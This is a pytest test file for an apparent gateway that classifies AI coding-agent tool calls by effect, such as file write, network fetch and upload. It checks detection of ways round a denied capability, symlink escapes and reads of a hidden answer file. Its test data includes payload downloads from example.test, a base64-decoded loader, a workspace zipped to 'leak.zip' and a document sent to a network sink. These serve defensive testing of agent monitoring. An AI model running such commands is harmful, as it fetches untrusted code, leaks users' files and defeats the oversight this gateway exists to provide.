from __future__ import annotations

import json

import pytest

from clawsentry.gateway.effect_normalizer import contextual_binding_parts, normalize_action_effect
from clawsentry.gateway.models import (
    CanonicalEvent,
    ContentEvidenceEnvelope,
    ContentEvidenceItem,
    DecisionContext,
    EventType,
    SessionScopeBaseRules,
    SessionScopeProfile,
    SessionScopeTaskRules,
)


def _event(
    *,
    tool_name: str,
    payload: dict,
    event_id: str = "evt-effect",
    source_framework: str = "test",
) -> CanonicalEvent:
    return CanonicalEvent(
        event_id=event_id,
        trace_id=f"trace-{event_id}",
        event_type=EventType.PRE_ACTION,
        session_id="sess-effect",
        agent_id="agent-effect",
        source_framework=source_framework,
        occurred_at="2026-05-16T00:00:00+00:00",
        payload=payload,
        tool_name=tool_name,
    )


def _disabled_context(*capabilities: str) -> DecisionContext:
    return DecisionContext(
        session_scope_profile=SessionScopeProfile(
            profile_id="scope-disabled-capabilities",
            confirmed=True,
            dry_run=False,
            base_rules=SessionScopeBaseRules(
                denied_capabilities=list(capabilities),
            ),
        )
    )


def _scoped_context(root: str) -> DecisionContext:
    return DecisionContext(
        session_scope_profile=SessionScopeProfile(
            profile_id="scope-script-binding",
            confirmed=True,
            dry_run=False,
            task_rules=SessionScopeTaskRules(allowed_path_prefixes=[root]),
        )
    )


def test_contextual_binding_parts_hashes_raw_paths_and_cwd():
    event = CanonicalEvent(
        event_id="evt-binding",
        trace_id="trace-binding",
        event_type="pre_action",
        session_id="sess-binding",
        agent_id="agent-binding",
        source_framework="test",
        occurred_at="2026-05-21T00:00:00+00:00",
        tool_name="bash",
        payload={
            "command": "python3 scripts/verify.py > artifacts/out.json",
            "cwd": "/workspace/private/project",
        },
    )

    parts = contextual_binding_parts(event)
    serialized = json.dumps(parts, sort_keys=True)

    assert parts["effect_hash"].startswith("sha256:")
    assert parts["cwd_hash"].startswith("sha256:")
    assert "/workspace/private/project" not in serialized
    assert "artifacts/out.json" not in serialized


def test_contextual_binding_parts_hashes_script_content_when_available(tmp_path):
    script = tmp_path / "scripts" / "verify.py"
    script.parent.mkdir()
    script.write_text("print('v1')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(tmp_path)},
        event_id="evt-script-content-v1",
    )

    context = _scoped_context(str(tmp_path))

    first = contextual_binding_parts(event, context)
    script.write_text("print('v2')\n", encoding="utf-8")
    second = contextual_binding_parts(event, context)

    assert first["script_or_content_hash"].startswith("sha256:")
    assert second["script_or_content_hash"].startswith("sha256:")
    assert first["script_or_content_hash"] != second["script_or_content_hash"]
    assert str(script) not in json.dumps(second, sort_keys=True)


def test_contextual_binding_parts_does_not_hash_absolute_script_paths(tmp_path):
    outside = tmp_path / "outside.py"
    outside.write_text("print('outside')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": f"python3 {outside}", "cwd": str(tmp_path / "workspace")},
        event_id="evt-script-absolute",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(tmp_path / "workspace")))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_symlink_escape(tmp_path):
    workspace = tmp_path / "workspace"
    script = workspace / "scripts" / "verify.py"
    outside = tmp_path / "outside.py"
    script.parent.mkdir(parents=True)
    outside.write_text("print('outside')\n", encoding="utf-8")
    script.symlink_to(outside)
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(workspace)},
        event_id="evt-script-symlink",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(workspace)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_oversize_script(tmp_path):
    script = tmp_path / "scripts" / "large.py"
    script.parent.mkdir()
    script.write_text("x = 1\n" * 200_000, encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/large.py", "cwd": str(tmp_path)},
        event_id="evt-script-large",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(tmp_path)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


def test_contextual_binding_parts_does_not_hash_when_cwd_outside_allowed_scope(tmp_path):
    workspace = tmp_path / "workspace"
    outside = tmp_path / "outside"
    script = outside / "scripts" / "verify.py"
    script.parent.mkdir(parents=True)
    workspace.mkdir()
    script.write_text("print('outside')\n", encoding="utf-8")
    event = _event(
        tool_name="bash",
        payload={"command": "python3 scripts/verify.py", "cwd": str(outside)},
        event_id="evt-script-outside-scope",
    )

    parts = contextual_binding_parts(event, _scoped_context(str(workspace)))

    assert parts["script_or_content_hash"] == parts["raw_payload_hash"]


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("Write", {"path": "build/loader.sh", "content": "#!/bin/sh\necho x"}, "native_write_effect"),
        ("bash", {"command": "printf '%s' x > build/loader.sh"}, "shell_redirection_write"),
        ("bash", {"command": "cat > build/loader.sh <<'EOF'\nx\nEOF"}, "shell_heredoc_write"),
        ("bash", {"command": "printf x | tee build/loader.sh"}, "shell_tee_write"),
        ("bash", {"command": "tee <<EOF build/loader.sh\nx\nEOF"}, "shell_tee_write"),
        ("bash", {"command": "base64 -d payload.b64 > build/loader.sh"}, "decode_to_file_write"),
        ("bash", {"command": "dd if=/tmp/payload of=build/loader.sh"}, "dd_output_write"),
        ("python", {"command": "python -c \"open('build/loader.sh', 'w').write('x')\""}, "python_file_write"),
        ("node", {"command": "node -e \"require('fs').writeFileSync('build/loader.sh', 'x')\""}, "node_file_write"),
        ("powershell", {"command": "Set-Content -Path build/loader.ps1 -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader.ps1\" -Value x"}, "powershell_file_write"),
        ("powershell", {"command": "Set-Content -Path \"build/loader script.ps1\" -Value x"}, "powershell_file_write"),
        ("Agent", {"prompt": "Create build/loader.sh with the payload from earlier."}, "delegated_write_request"),
        ("bash", {"command": "curl https://example.test/payload.sh -o build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "wget https://example.test/payload.sh -O build/loader.sh"}, "network_download_write"),
        ("bash", {"command": "scp host:/tmp/payload build/loader.sh"}, "network_download_write"),
    ],
)
def test_filesystem_write_equivalents_have_common_effect_and_redacted_targets(
    tool_name,
    payload,
    expected_rule,
):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "filesystem.write" in envelope.effects
    assert expected_rule in envelope.evidence_rules
    assert envelope.confidence in {"medium", "high"}
    assert envelope.targets
    assert envelope.targets[0].path_hash.startswith("sha256:")

    summary = envelope.to_summary()
    serialized = json.dumps(summary, sort_keys=True)
    assert "build/loader.sh" not in serialized
    assert "build/loader.ps1" not in serialized
    assert "build/loader script.ps1" not in serialized
    assert payload.get("command", payload.get("content", payload.get("prompt", ""))) not in serialized


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_rule"),
    [
        ("bash", {"command": "curl https://example.test/payload.sh -o payload.sh"}, "network_equivalent_fetch"),
        ("python", {"command": "python -c \"import requests; requests.get('https://example.test')\""}, "python_network_fetch"),
        ("node", {"command": "node -e \"fetch('https://example.test')\""}, "node_network_fetch"),
    ],
)
def test_network_fetch_equivalents_share_network_effect(tool_name, payload, expected_rule):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert "network.fetch" in envelope.effects
    assert expected_rule in envelope.evidence_rules


@pytest.mark.parametrize(
    ("tool_name", "payload", "expected_effect", "expected_role", "expected_rule"),
    [
        ("Read", {"file_path": "docs/plan.md"}, "filesystem.read", "workspace_file", "native_read_effect"),
        ("Glob", {"path": "docs", "pattern": "*.md"}, "filesystem.enumerate", "workspace_directory", "native_enumerate_effect"),
        ("bash", {"command": "cat docs/plan.md"}, "filesystem.read", "workspace_file", "shell_read_probe"),
        ("bash", {"command": "ls docs"}, "filesystem.enumerate", "workspace_directory", "shell_enumerate_probe"),
        ("bash", {"command": "which python3"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "python3 --version"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "npm root -g"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "npm list -g --depth=0 docx"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "clawsentry --help"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "echo hi"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "git rev-parse --is-inside-work-tree"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "perl -e 'print \"ok\\n\"'"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "node -e 'console.log(\"ok\")'"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        ("bash", {"command": "awk 'BEGIN{print \"ok\"}'"}, "environment.probe", "capability_probe", "shell_capability_probe"),
        (
            "bash",
            {"command": 'python3 -c "import reportlab; print(reportlab.__version__)"'},
            "environment.probe",
            "capability_probe",
            "shell_capability_probe",
        ),
        (
            "bash",
            {"command": 'node -e "console.log(\'pptxgenjs\',!!require(\'pptxgenjs\'))"'},
            "environment.probe",
            "capability_probe",
            "shell_capability_probe",
        ),
        (
            "bash",
            {
                "command": "python - <<'PY'\n"
                "import os\n"
                "print('exists' if os.path.exists('/workspace/medication_info.docx') else 'missing')\n"
                "PY"
            },
            "filesystem.read",
            "workspace_file",
            "python_path_probe",
        ),
        (
            "bash",
            {
                "command": "python3 - <<'PY'\n"
                "import importlib.util\n"
                "print(bool(importlib.util.find_spec('reportlab')))\n"
                "PY"
            },
            "environment.probe",
            "capability_probe",
            "shell_capability_probe",
        ),
        (
            "Read",
            {"file_path": ".codex/skills/travel-planning/SKILL.md"},
            "filesystem.read",
            "skill_package_read",
            "native_read_effect",
        ),
        (
            "bash",
            {
                "command": "python - <<'PY'\n"
                "from pathlib import Path\n"
                "p = Path('/home/agent/.skill-runtime/codex/skills/write-unit-tests/SKILL.md')\n"
                "print(p.read_text())\n"
                "PY"
            },
            "filesystem.read",
            "skill_package_read",
            "python_file_read",
        ),
    ],
)
def test_read_list_probe_effects_have_redacted_targets(
    tool_name,
    payload,
    expected_effect,
    expected_role,
    expected_rule,
):
    envelope = normalize_action_effect(_event(tool_name=tool_name, payload=payload))

    assert expected_effect in envelope.effects
    assert expected_rule in envelope.evidence_rules
    assert envelope.confidence in {"medium", "high"}
    assert any(target.path_role == expected_role for target in envelope.targets)

    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    for raw_value in payload.values():
        if isinstance(raw_value, str):
            assert raw_value not in serialized


def test_stderr_to_devnull_is_not_persistent_shell_write():
    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "find /workspace -name AGENTS.md 2>/dev/null"})
    )

    assert "filesystem.enumerate" in envelope.effects
    assert "filesystem.write" not in envelope.effects
    assert "shell_redirection_write" not in envelope.evidence_rules
    assert any(target.path_role == "workspace_directory" for target in envelope.targets)


def test_shell_redirection_parser_ignores_quoted_pdf_syntax():
    envelope = normalize_action_effect(
        _event(
            tool_name="bash",
            payload={"command": 'python3 -c $\'print("<< /Type /Catalog >>")\''},
        )
    )

    assert "filesystem.write" not in envelope.effects
    assert "shell_redirection_write" not in envelope.evidence_rules


def test_shell_redirection_parser_ignores_heredoc_pdf_syntax():
    command = (
        "python - <<'PY'\n"
        "page = '<< /Type /Page /Resources << /Font << /F1 1 0 R >> >> >>'\n"
        "def wrap_line(line: str) -> list[str]:\n"
        "    return [line]\n"
        "print(page)\n"
        "PY"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.write" not in envelope.effects
    assert "shell_redirection_write" not in envelope.evidence_rules


def test_shell_segment_parser_keeps_awk_pdf_program_quoted():
    command = (
        "awk '\n"
        "BEGIN {\n"
        "  page = \"<< /Type /Page /Parent \" pages_obj \" 0 R >>\";\n"
        "  catalog = \"<< /Type /Catalog /Pages \" pages_obj \" 0 R >>\";\n"
        "}\n"
        "{ print; }\n"
        "' /workspace/medication_info.txt"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert envelope.effects == ["filesystem.read"]
    assert "shell_read_probe" in envelope.evidence_rules
    assert all(target.workspace_relation == "inside_workspace" for target in envelope.targets)


def test_python_pathlib_variable_write_has_redacted_workspace_target():
    command = (
        "python3 -c 'from pathlib import Path; "
        "src = Path(\"/workspace/medication_info.txt\"); "
        "dst = src.with_suffix(\".pdf\"); "
        "dst.write_bytes(b\"x\")'"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.write" in envelope.effects
    assert "python_file_write" in envelope.evidence_rules
    assert "shell_redirection_write" not in envelope.evidence_rules
    assert any(target.path_role == "workspace_file" for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.pdf" not in serialized


def test_python_pathlib_exists_variable_read_has_redacted_workspace_target():
    command = (
        "python - <<'PY'\n"
        "from pathlib import Path\n"
        "p = Path('/workspace/medication_info.docx')\n"
        "print('exists' if p.exists() else 'missing')\n"
        "PY"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.read" in envelope.effects
    assert "python_path_probe" in envelope.evidence_rules
    assert any(target.path_role == "workspace_file" for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.docx" not in serialized


def test_python_library_save_and_bound_read_have_redacted_targets():
    command = (
        "python - <<'PY'\n"
        "from pathlib import Path\n"
        "from docx import Document\n"
        "src = Path('/workspace/medication_info.txt')\n"
        "out = Path('/workspace/medication_info.docx')\n"
        "text = src.read_text(encoding='utf-8')\n"
        "doc = Document()\n"
        "doc.save(out)\n"
        "PY"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.read" in envelope.effects
    assert "filesystem.write" in envelope.effects
    assert "python_file_read" in envelope.evidence_rules
    assert "python_file_write" in envelope.evidence_rules
    assert any(target.path_role == "workspace_file" for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.txt" not in serialized
    assert "/workspace/medication_info.docx" not in serialized


def test_node_library_write_file_object_has_redacted_workspace_target():
    command = 'node -e "pptx.writeFile({ fileName: \'/workspace/medication_info.pptx\' })"'

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.write" in envelope.effects
    assert "node_file_write" in envelope.evidence_rules
    assert any(target.path_role == "workspace_file" for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.pptx" not in serialized


@pytest.mark.parametrize(
    ("command", "expected_rule", "expected_role"),
    [
        (
            "mkdir -p /workspace/.docx_build_medication/_rels /workspace/.docx_build_medication/word",
            "shell_directory_create",
            "workspace_directory",
        ),
        (
            "cd /workspace/.docx_build_medication && zip -qr /workspace/medication_info.docx [Content_Types].xml _rels docProps word",
            "archive_creation_write",
            "workspace_file",
        ),
        (
            "python /workspace/create_medication_pdf.py",
            "interpreter_script_execution",
            "future_execution.artifact",
        ),
    ],
)
def test_local_artifact_generation_shell_effects_have_redacted_targets(command, expected_rule, expected_role):
    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    expected_effect = "command.exec" if expected_rule == "interpreter_script_execution" else "filesystem.write"
    assert expected_effect in envelope.effects
    assert expected_rule in envelope.evidence_rules
    assert any(target.path_role == expected_role for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.docx" not in serialized
    assert "/workspace/create_medication_pdf.py" not in serialized


def test_archive_creation_resolves_parent_target_after_workspace_cd():
    command = "cd /workspace/.docx_build_medication && zip -qr ../medication_info.docx ."

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.write" in envelope.effects
    assert "archive_creation_write" in envelope.evidence_rules
    assert envelope.targets
    assert envelope.targets[0].path_role == "workspace_file"
    assert envelope.targets[0].workspace_relation == "inside_workspace"
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "../medication_info.docx" not in serialized
    assert "/workspace/medication_info.docx" not in serialized


def test_archive_creation_keeps_parent_target_outside_when_cd_cannot_contain_it():
    command = "cd /workspace && zip -qr ../leak.zip ."

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "archive_creation_write" in envelope.evidence_rules
    assert envelope.targets
    assert envelope.targets[0].workspace_relation == "outside_workspace_or_absolute"


def test_awk_internal_file_write_has_redacted_workspace_target():
    command = (
        "fold -s -w 76 /workspace/medication_info.txt | awk '"
        "BEGIN { out = \"/workspace/medication_info.pdf\" } "
        "{ lines[++n] = $0 } "
        "END { printf \"%s\", lines[1] > out; close(out) }'"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.write" in envelope.effects
    assert "awk_file_write" in envelope.evidence_rules
    assert envelope.targets
    assert envelope.targets[0].path_role == "workspace_file"
    assert envelope.targets[0].workspace_relation == "inside_workspace"
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/medication_info.pdf" not in serialized


def test_python_path_collection_skill_manifest_read_is_detected():
    command = (
        "python - <<'PY'\n"
        "from pathlib import Path\n"
        "paths = [\n"
        "    Path('/workspace/.codex/skills/pptx/SKILL.md'),\n"
        "    Path('/home/agent/.skill-runtime/codex/skills/pptx/SKILL.md'),\n"
        "]\n"
        "for p in paths:\n"
        "    if p.exists():\n"
        "        print(p.read_text())\n"
        "        break\n"
        "PY"
    )

    envelope = normalize_action_effect(_event(tool_name="bash", payload={"command": command}))

    assert "filesystem.read" in envelope.effects
    assert "python_file_read" in envelope.evidence_rules
    assert any(target.path_role == "skill_package_read" for target in envelope.targets)
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "/workspace/.codex/skills/pptx/SKILL.md" not in serialized


def test_parent_directory_read_is_not_inside_workspace():
    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "cat ../outside.txt"})
    )

    assert "filesystem.read" in envelope.effects
    assert envelope.targets
    assert envelope.targets[0].workspace_relation == "outside_workspace_or_absolute"


def test_shell_source_file_read_does_not_become_future_execution_artifact():
    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "sed -n '1,120p' db_migrate.py"})
    )

    assert "filesystem.read" in envelope.effects
    assert "future_execution.artifact" not in envelope.effects
    assert "generated_script_future_exec" not in envelope.evidence_rules
    assert any(target.path_role == "workspace_file" for target in envelope.targets)


def test_hidden_oracle_read_has_exclusion_role():
    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "cat hidden_oracle/expected_answer.txt"})
    )

    assert "filesystem.read" in envelope.effects
    assert any(target.path_role == "hidden_oracle" for target in envelope.targets)


@pytest.mark.parametrize(
    ("source_framework", "tool_name", "payload", "expected_effect", "expected_rule"),
    [
        ("codex", "Read", {"file_path": "docs/plan.md"}, "filesystem.read", "native_read_effect"),
        ("codex", "List", {"path": "docs"}, "filesystem.enumerate", "native_enumerate_effect"),
        ("claude-code", "Grep", {"path": "docs", "pattern": "TODO"}, "filesystem.enumerate", "native_enumerate_effect"),
        ("claude-code", "Edit", {"file_path": "docs/plan.md", "content": "x"}, "filesystem.write", "native_write_effect"),
        ("kimi-cli", "Read", {"file_path": "docs/plan.md"}, "filesystem.read", "native_read_effect"),
        ("kimi-cli", "Write", {"file_path": "docs/out.md", "content": "x"}, "filesystem.write", "native_write_effect"),
        ("gemini-cli", "read_file", {"path": "docs/plan.md"}, "filesystem.read", "native_read_effect"),
        ("gemini-cli", "write_file", {"path": "docs/out.md", "content": "x"}, "filesystem.write", "native_write_effect"),
    ],
)
def test_native_tool_matrix_real_frameworks_emit_canonical_effects(
    source_framework,
    tool_name,
    payload,
    expected_effect,
    expected_rule,
):
    envelope = normalize_action_effect(_event(
        source_framework=source_framework,
        tool_name=tool_name,
        payload=payload,
    ))

    assert expected_effect in envelope.effects
    assert expected_rule in envelope.evidence_rules
    serialized = json.dumps(envelope.to_summary(), sort_keys=True)
    assert "docs/plan.md" not in serialized
    assert "docs/out.md" not in serialized


def test_network_download_to_file_matches_disabled_filesystem_write():
    envelope = normalize_action_effect(
        _event(
            tool_name="bash",
            payload={"command": "curl https://example.test/payload.sh -o build/loader.sh"},
        ),
        context=_disabled_context("filesystem.write"),
    )

    assert "filesystem.write" in envelope.effects
    assert "network.fetch" in envelope.effects
    assert "network_download_write" in envelope.evidence_rules
    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_disabled_capability_context_marks_equivalent_effect():
    event = _event(
        tool_name="bash",
        payload={"command": "printf '%s' x > build/loader.sh"},
    )
    envelope = normalize_action_effect(
        event,
        context=_disabled_context("filesystem.write"),
    )

    assert "disabled_capability_equivalent" in envelope.evidence_rules
    assert envelope.disabled_capabilities == ["filesystem.write"]


def test_unsupported_semantic_wrapper_is_explicit_not_silent_allow():
    event = _event(
        tool_name="bash",
        payload={"command": "bash <(cat build/generated.sh)"},
    )
    envelope = normalize_action_effect(event, context=_disabled_context("command.exec"))

    assert envelope.analysis_state == "unsupported"
    assert "wrapper_chain_unresolved" in envelope.evidence_rules


def test_content_evidence_upload_adds_network_upload_effect():
    context = DecisionContext(
        content_evidence=ContentEvidenceEnvelope(
            items=[
                ContentEvidenceItem(
                    canonical_evidence_id="ce_001",
                    kind="skill_script",
                    source="gateway_resolved_path",
                    path_trust="gateway_resolved_workspace",
                    resolver_status="resolved_static_local_path",
                    derived_rules=[
                        {"rule_id": "associated_script_network_sink", "severity": "high"},
                        {"rule_id": "document_input_to_network_sink", "severity": "high"},
                    ],
                )
            ]
        )
    )

    envelope = normalize_action_effect(
        _event(tool_name="bash", payload={"command": "python file_backup.py Q4_financial_report.pptx"}),
        context=context,
    )
    summary = envelope.to_summary()

    assert "network.upload" in summary["effects"]
    assert "associated_script_network_sink" in summary["evidence_rules"]
    assert "document_input_to_network_sink" in summary["evidence_rules"]
    assert {target["path_role"] for target in summary["targets"]} >= {"executed_script", "document_input"}
